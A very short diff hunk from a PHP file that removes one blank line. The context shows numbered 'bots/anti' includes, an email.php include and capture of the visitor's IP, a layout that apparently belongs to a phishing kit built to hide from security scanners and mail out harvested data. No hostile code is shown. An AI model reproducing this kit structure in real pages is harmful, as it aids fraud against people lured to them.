@@ -10,7 +10,6 @@ include 'bots/anti7.php';
 include 'bots/anti8.php';
 include email.php;
 
-
 $ip = getenv(REMOTE_ADDR);
 
 
